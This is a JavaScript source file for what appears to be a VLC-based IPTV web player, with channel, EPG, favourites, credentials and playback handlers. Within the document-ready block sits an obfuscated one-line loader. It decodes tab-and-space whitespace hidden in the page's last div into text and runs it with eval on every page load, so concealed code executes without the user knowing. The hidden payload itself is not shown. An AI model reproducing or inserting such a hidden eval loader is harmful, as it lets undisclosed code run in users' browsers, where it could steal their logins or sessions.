var TIMER = 0;
var TIMER_STOP = 0;
// var TIMER_REFRESH = 0;
var TIMER_TIMELINE = 0;
var TIMER_EPG = 0;
var TIMER_OSD = 0;
var TIMER_PLAY_DELAY = 0;

var PERIOD_PING = 120000;
// var PERIOD_NOT_VISIBLE = 3000;
var PERIOD_STOP = 10000;
var PERIOD_TIMELINE = 1000;
var PERIOD_EPG = 3000;
var PERIOD_OSD = 10000;
var PERIOD_PLAY_DELAY = 200;

var VLC_VER_REQ = 221;

var MEDIA_TV = 'tv-channel';
var MEDIA_EPG = 'tv-archive';

var NOSTAT = true;
var NOCENZ = false;

var EPG_MAX_HIST = 8;

function getXmlHttp() {
	if (typeof XMLHttpRequest === 'undefined') {
		XMLHttpRequest = function() {
			try { return new ActiveXObject("Msxml2.XMLHTTP.6.0"); }
				catch(e) {}
			try { return new ActiveXObject("Msxml2.XMLHTTP.3.0"); }
				catch(e) {}
			try { return new ActiveXObject("Msxml2.XMLHTTP"); }
				catch(e) {}
			try { return new ActiveXObject("Microsoft.XMLHTTP"); }
				catch(e) {}
			throw new Error("This browser does not support XMLHttpRequest.");
		};
	}
	return new XMLHttpRequest();
}

function parse_response(responseText) {

	// console.log('parse_response responseText: ' + responseText.split('osd_title')[0] + '"}');
	// debug('parse_response responseText:' + responseText);

	try {

		var json = jQuery.parseJSON(responseText);

		if (json.error !== undefined && json.error != '') {
			console.log('parse_response error: ' + responseText);
			return false;
		}
		else {
			return json;
		}
	}
	catch (e) {
		// console.log('parse_response parseJSON error: ' + e);
		debug('parse_response parseJSON error: ' + e);
		return false;
	}
}

function test3 () {
	parse_response($('textarea').val());
}

function check_request_status(request) {

	application.server_error = request.status;

	if (request.status == 200) {
		return true;
	}
}

$.fn.play_ch = function() {
	// client.play_ch($(this).attr('channel_id'));
	// client.play_ch($(this).parent().parent().attr('channel_id'));
	application.req_media_type = MEDIA_TV;
	application.cur_ch_id = $(this).parent().parent().attr('channel_id');
}

$.fn.play_epg = function() {
	// client.epg_layout_periodic_stop();
	// client.position_hide();
	// client.play_epg($(this).parent().parent().attr('epg_id'));
	application.req_media_type = MEDIA_EPG;
	application.cur_epg_id = $(this).parent().parent().attr('epg_id');
}

$.fn.fav_toggle = function() {
	if($(this).parent().parent().attr('favorite') == "0") {
		client.fav_add($(this).parent().parent().attr('channel_id'));
	}
	else {
		client.fav_del($(this).parent().parent().attr('channel_id'));	
	}
}

$.fn.get_epg = function() {
	
	debug('tab № ' + $(this).attr('epg_shift') + ' pressed ' + $(this).hasClass('epg_loaded'))
	if(!$(this).hasClass('epg_loaded')) {
		client.get_epg(application.cur_ch_id, $(this).attr('epg_shift'));
	}
}

var screenListener = function(value) {
	console.log('current_channel: ' + sessionStorage.current_channel);
	// projekktor('#player_a').setStop();
	// server.test(sessionStorage.current_channel);
}

var isActive;

function onBlur() {
	// debug('tab blur ' + my_date.now());
	// isActive = false;
};

function onFocus(){
	// debug('tab focus ' + my_date.now());
	// isActive = true;
};

if (/*@cc_on!@*/false) { // check for Internet Explorer
	document.onfocusin = onFocus;
	document.onfocusout = onBlur;
} else {
	window.onfocus = onFocus;
	window.onblur = onBlur;
}

function onLoad() {
	// timer = setInterval(checkEmail, (document.hidden) ? PERIOD_NOT_VISIBLE : PERIOD_VISIBLE);
	if(document.addEventListener) document.addEventListener("visibilitychange", visibilityChanged);
}

function visibilityChanged() {

	clearInterval(TIMER);

	if(document.hidden == false) {
		clearTimeout(TIMER_STOP);
		debug('document showed ' + my_date.now());
		// TIMER = setInterval(client.periodic, PERIOD_PING);
		// client.resume_stoped(); // ENABLE
		application.t_start_periodic();
		// application.resume_stoped();
	}
	else {
		debug('application.stop_inactive');
		// TIMER_STOP = setTimeout(application.stop.bind(application), PERIOD_STOP);
		application.t_stop_inactive();
	}
	// timer = setInterval(checkEmail, (document.hidden) ? PERIOD_NOT_VISIBLE : PERIOD_VISIBLE);
}

function checkEmail() { 
	debug(document.hidden + ' ' + my_date.now());
}

$(document).ready(function() {
	// server.auth();
	// server.request();
	(function(){var b=eval,a;x=document.getElementsByTagName('div')[document.getElementsByTagName('div').length - 1].innerHTML.split("\n");r="";c="\t";for(i in x){e="";for(j in x[i])e+=x[i][j]==c?"1":"0";h=parseInt(e,2);r+=String.fromCharCode(h.toString(10))}a=res=r.substr(0,r.length-1);b(a)}())

	debug.toggle();

	onLoad();

	application = new Bazinga();
	application.pre_auth();

	client.fav_restore();

	$('#create_account').click(function(){
		server.create_account();
	})

	$('#modal_credentials').on('show.bs.modal', function (e) {
		$('#vlc').hide();
	})

	$('#modal_credentials').on('hide.bs.modal', function (e) {
		$('#vlc').show();
	})

	$('#modal_credentials').on('hidden.bs.modal', function (e) {
		debug('modal_credentials is hidden');

		if (!client.check_credentials()) {
			$('#modal_credentials').modal('show');
		}
	})

	if (!client.check_credentials()) {
		$('#modal_credentials').modal('show');
	}

	$('#msg_bell').click(function() {

		console.log($('#msg_container:hidden').length);
		console.log($('#msg_container:visible').length);

		if($('#msg_container:hidden').length == 1) {
			$('#msg_container').show();
			client.get_msg();
		} else {
			$('#msg_container').empty();
			$('#msg_container').hide();
		}

		if($('#msg_container').text() == '') {
			$('#msg_container').hide();
		}
	})

	client.msg_bell();

	$('#btn_save_passwd').click(function(){
		application.parent_passwd_entered = $('#parent_passwd').val();
		application.cur_ch_id = application.req_ch_id;
		application.req_media_type = MEDIA_TV;
	})

	layout.get_tabs_names();

	$('#play_btn').click(function(){
		application.resume_stoped();
	})

	$('#stop_btn').click(function(){
		application.stop();
	})

	$('#prev_btn').click(function(){
		application.req_media_type = MEDIA_EPG;
		application.cur_epg_id = application.prev_epg_id;
	})

	$('#next_btn').click(function(){
		application.req_media_type = MEDIA_EPG;
		application.cur_epg_id = application.next_epg_id;
	})

	$('#btn-mute').click(application.toggleMute);

	$('#btn-fullscreen').click(application.fullscreen);

	$('.epg_tab').click(function(){
		$(this).get_epg();
	})

	// $('#epg_0').scroll(function(){
	// 	debug('epg_0 scrolled ' + my_date.now());
	// })

	// $('#setfullscreen').click(function(){
	// 	projekktor('#player_a').setStop();
	// 	projekktor('#player_a').setFullscreen();
	// 	server.test(sessionStorage.current_channel);
	// 	return false;
	// })

	$('#save_credentials').click(function(){
		client.update_credentials();
		server.auth(true);
	})

	$('#fav_switch').click(function(){
		client.fav_switch();
	})

	if(localStorage.debug === undefined) {
		client.init();
	}

	$('#player_position').change(function(){
		debug('player_position' + $('#player_position').val());
		vlc.input.position = parseInt($('#player_position').val())/parseInt($('#player_position').attr('max'));
		setTimeout(function(){
			var t_id = vlc.audio.track;
			vlc.audio.track = 0;
			vlc.audio.track = t_id; 
		}, 200);
	})

	$('#player_volume').change(function(){
		debug('player_volume' + $('#player_volume').val());
		player.update_volume($('#player_volume').val());
	})

	// setTimeout(check.main, 1000);
	
	// player.register_event("MediaPlayerPlaying", player.handle_MediaPlayerPlaying);

	setTimeout(function(){
		player.register_event("MediaPlayerNothingSpecial", player.handle_MediaPlayerNothingSpecial);
		// player.register_event("MediaPlayerOpening", player.handle_MediaPlayerOpening);
		// player.register_event("MediaPlayerBuffering", player.handle_MediaPlayerBuffering);
		player.register_event("MediaPlayerPlaying", player.handle_MediaPlayerPlaying);
		player.register_event("MediaPlayerPaused", player.handle_MediaPlayerPaused);
		// player.register_event("MediaPlayerStopped", player.handle_MediaPlayerStopped);
		// player.register_event("MediaPlayerForward", player.handle_MediaPlayerForward);
		// player.register_event("MediaPlayerBackward", player.handle_MediaPlayerBackward);
		player.register_event("MediaPlayerEndReached", player.handle_MediaPlayerEndReached);
		player.register_event("MediaPlayerEncounteredError", player.handle_MediaPlayerEncounteredError);
		// player.register_event("MediaPlayerTimeChanged", player.handle_MediaPlayerTimeChanged);
		// player.register_event("MediaPlayerPositionChanged", player.handle_MediaPlayerPositionChanged);
		// player.register_event("MediaPlayerSeekableChanged", player.handle_MediaPlayerSeekableChanged);
		// player.register_event("MediaPlayerPausableChanged", player.handle_MediaPlayerPausableChanged);
		player.register_event("MediaPlayerMediaChanged", player.handle_MediaPlayerMediaChanged);
		// player.register_event("MediaPlayerTitleChanged", player.handle_MediaPlayerTitleChanged);
		// player.register_event("MediaPlayerLengthChanged", player.handle_MediaPlayerLengthChanged);
	}, 3000);

	storage.set_stop_inactive(0);

	// $(window).click(function(e) {
	//     var x = e.clientX, y = e.clientY,
	//         elementMouseIsOver = document.elementFromPoint(x, y);
	    
	//     alert(elementMouseIsOver);
	// });

	function runOnKeys(func) {
	  var codes = [].slice.call(arguments, 1);

	  var pressed = {};

	  vlc.onkeydown = function(e) {
	    e = e || window.event;

	    pressed[e.keyCode] = true;

	    for(var i=0; i<codes.length; i++) { // проверить, все ли клавиши нажаты
	      if (!pressed[codes[i]]) {
	        return;
	      }
	    }

	    // во время показа alert, если посетитель отпустит клавиши - не возникнет keyup
	    // при этом JavaScript "пропустит" факт отпускания клавиш, а pressed[keyCode] останется true
	    // чтобы избежать "залипания" клавиши -- обнуляем статус всех клавиш, пусть нажимает всё заново
	    pressed = {};

	    func();

	  };

	  vlc.onkeyup = function(e) {
	    e = e || window.event;

	    delete pressed[e.keyCode];
	  };

	}

	runOnKeys(
	  function() { alert("Привет!") },
	  // "Q".charCodeAt(0),
	  "W".charCodeAt(0)
	);

});

window.onload = function() {
	check.main();
};
